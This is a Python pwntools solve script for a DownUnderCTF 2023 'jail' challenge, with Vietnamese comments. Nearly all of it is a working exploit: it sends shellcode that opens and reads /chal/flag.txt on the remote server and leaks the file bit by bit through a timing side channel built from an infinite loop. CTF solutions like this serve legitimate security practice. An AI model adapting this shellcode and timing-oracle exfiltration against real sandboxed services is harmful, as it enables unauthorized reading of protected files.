from pwn import *
elf = context.binary = ELF("./jail")
r = elf.process()

# gdb.attach(r, '''
#     b* main + 197\n
#            c
# ''')

def leak_byte(byte_offset):
    byte = ""
    for bit_offset in range(8):
        r = remote("2023.ductf.dev", 30010)
        shellcode = asm(
            shellcraft.amd64.linux.openat(0x0,"/chal/flag.txt")
            + shellcraft.amd64.linux.read("rax", "rsp", 0x20)
            + f'''
                shellcode3:
                    mov bl , [rsp+{byte_offset}]
                    shr bl, {bit_offset}
                    shl bl, 7
                    shr bl, 7
                    cmp bl, 0
                    je exit
                    jmp shellcode3
                exit:
            '''
            )
        r.sendline(shellcode)
        begin = time.time() # time tính từ lúc bắt đầu gửi shellcode
        r.recvall(timeout = 1)
        after = time.time()  #Time đến khi quá trình nhận hoàn tất.
        if((after - begin) > 1):
            byte += "1"
        else:
            byte += "0"
    print(byte)
    char = int(byte[::-1], 2)
    return char

flag = ""
for i in range (60):
    byte = leak_byte(i)
    flag += chr(byte)
    print(flag)

r.interactive()